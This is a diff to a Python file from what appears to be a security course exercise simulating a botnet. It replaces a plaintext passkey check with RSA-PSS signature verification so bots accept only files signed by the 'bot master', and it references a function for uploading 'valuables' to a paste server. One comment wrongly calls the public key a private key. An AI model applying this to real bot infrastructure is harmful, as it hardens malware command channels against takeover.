@@ -1,4 +1,7 @@
 import os
+from Crypto.Signature import PKCS1_PSS
+from Crypto.Hash import SHA
+from Crypto.PublicKey import RSA
 
 # Instead of storing files on disk,
 # we'll save them in memory for simplicity
@@ -32,11 +35,18 @@ def upload_valuables_to_pastebot(fn):
 
 def verify_file(f):
     # Verify the file was sent by the bot master
-    # TODO: For Part 2, you'll use public key crypto here
-    # Naive verification by ensuring the first line has the "passkey"
     lines = f.split(bytes("\n", "ascii"), 1)
-    first_line = lines[0]
-    if first_line == bytes("Caesar", "ascii"):
+    signature = lines[0]
+    message = lines[1]
+    # Read in the private key
+    key = RSA.importKey(open(os.path.join("pastebot.net", "master_rsa.pub")).read())
+    
+    #verify the signature
+    h = SHA.new()
+    h.update(message)
+    verifier = PKCS1_PSS.new(key)
+    
+    if verifier.verify(h, signature):
         return True
     return False
 
